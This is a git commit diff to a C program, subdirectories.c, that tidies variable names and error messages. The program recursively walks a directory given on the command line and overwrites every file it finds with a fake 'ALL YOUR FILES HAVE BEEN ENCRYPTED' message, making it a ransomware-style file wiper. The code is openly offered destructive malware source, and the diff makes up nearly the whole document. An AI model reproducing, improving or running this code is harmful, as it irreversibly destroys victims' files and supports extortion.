664e9d7c6cbd55adc27367a8c733e72a10124141
4$X <114998095+webRemi@users.noreply.github.com>
2025-03-04 10:38:14 +0100

    Update subdirectories.c
    Verbose, better syntax

--- subdirectories.c
+++ subdirectories.c
@@ -2,77 +2,70 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <strsafe.h>
-#include <tchar.h>
-#pragma comment(lib, "User32.lib")
 
 #define ERROR "[-]"
 #define SUCCESS "[+]"
 #define INFO "[>]"
 
-BOOL SpiderDirectory(char *DirectoryName, unsigned char *encrypted_code) {
+BOOL SpiderDirectory(char *cDirectoryName, unsigned char *cEncryptedCode) {
     WIN32_FIND_DATA ffd;
-    LPCSTR szDir[MAX_PATH];
-    LPCSTR finalDir[MAX_PATH];
+    LPCSTR lpPartialDirectory[MAX_PATH];
+    LPCSTR lpFullDirectory[MAX_PATH];
     HANDLE hFind = INVALID_HANDLE_VALUE;
     LARGE_INTEGER filesize;
-    long file_size;
-    file_size = strlen(encrypted_code);
-    LPCSTR lpFileName = NULL;
-    char fullPath[MAX_PATH];
-    LPCSTR ultraDir[MAX_PATH];
-    LPCSTR subDir[MAX_PATH];
+    long lEncryptedCodeSize;
+    
+    lEncryptedCodeSize = strlen(cEncryptedCode);
 
-    StringCchCopy(szDir, MAX_PATH, DirectoryName);
-    sprintf(finalDir, "%s\\\\*", szDir);
+    StringCchCopy(lpPartialDirectory, MAX_PATH, cDirectoryName);
+    sprintf(lpFullDirectory, "%s\\\\*", lpPartialDirectory);
 
-    printf("===========%s\n", finalDir);
+    printf("%s Target directory is: %s\n", INFO, cDirectoryName);
 
-    printf("\nTarget directory is %s\n\n", DirectoryName);
-
-    hFind = FindFirstFileA(finalDir, &ffd);
+    hFind = FindFirstFileA(lpFullDirectory, &ffd);
     if (hFind == INVALID_HANDLE_VALUE) {
         printf("%s FindFirstFile failed with error: 0x%x\n", ERROR, GetLastError());
     }
     do {
         if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            if (strcmp(".", ffd.cFileName) == 0 || strcmp("..", ffd.cFileName) == 0) {
+            if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) {
                 continue;
             }
-            sprintf(subDir, "%s\\%s", szDir, ffd.cFileName);
-            printf("%s   <DIR>\n", subDir);
-            SpiderDirectory(subDir, encrypted_code);
+            sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);
+            printf("%s   <DIR>\n", lpFullDirectory);
+            SpiderDirectory(lpFullDirectory, cEncryptedCode);
         }
         else {
             filesize.LowPart = ffd.nFileSizeLow;
             filesize.HighPart = ffd.nFileSizeHigh;
             printf("%s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
-            lpFileName = ffd.cFileName;
-            sprintf(ultraDir, "%s\\%s", szDir, lpFileName);
-            WriteToFile(ultraDir, encrypted_code, file_size);
+            sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);
+            WriteToFile(lpFullDirectory, cEncryptedCode, lEncryptedCodeSize);
         }
     } while (FindNextFileA(hFind, &ffd) != 0);
 }
 
-BOOL WriteToFile(LPCSTR lFileName, unsigned char* encrypted_code, long file_size) {
+BOOL WriteToFile(LPCSTR lpFileName, unsigned char* cEncryptedCode, long lEncryptedCodeSize) {
     HANDLE hEncryptedFile = NULL;
 
-    printf("%s filename: '%s'\n", INFO, lFileName);
-    hEncryptedFile = CreateFileA(lFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    printf("%s filename: '%s'\n", INFO, lpFileName);
+    hEncryptedFile = CreateFileA(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hEncryptedFile == INVALID_HANDLE_VALUE) {
-        printf("%s CreateFile failed with error: 0x%x\n", ERROR);
+        printf("%s CreateFile failed with error: 0x%x\n", ERROR, GetLastError());
+        return -1;
     }
 
-    DWORD bytesWritten;
-    printf("%s filesize: %d\n", INFO, file_size);
-    if (!WriteFile(hEncryptedFile, encrypted_code, file_size, &bytesWritten, NULL)) {
-        printf("WriteFile failed with error: 0x%x\n");
+    DWORD dwBytesWritten;
+    printf("%s filesize: %d\n", INFO, lEncryptedCodeSize);
+    if (!WriteFile(hEncryptedFile, cEncryptedCode, lEncryptedCodeSize, &dwBytesWritten, NULL)) {
+        printf("%s WriteFile failed with error: 0x%x\n", ERROR, GetLastError());
         return 1;
     }
 }
 
 int main(int argc, char* argv[]) {
     //Must be in format C:\\Users
-    char* DirectoryName = argv[1];
-    unsigned char* encrypted_code = "Yaaaaaa lets pwn the world cray motherfucker!!!!!!!! FTW FTW FTW ASX WAS HERE FTW FTW FTW==============";
-    SpiderDirectory(DirectoryName, encrypted_code);
+    char* cDirectoryName = argv[1];
+    unsigned char* cEncryptedCode = "====================ALL YOUR FILES HAVE BEEN ENCRYPTED...====================";
+    SpiderDirectory(cDirectoryName, cEncryptedCode);
 }
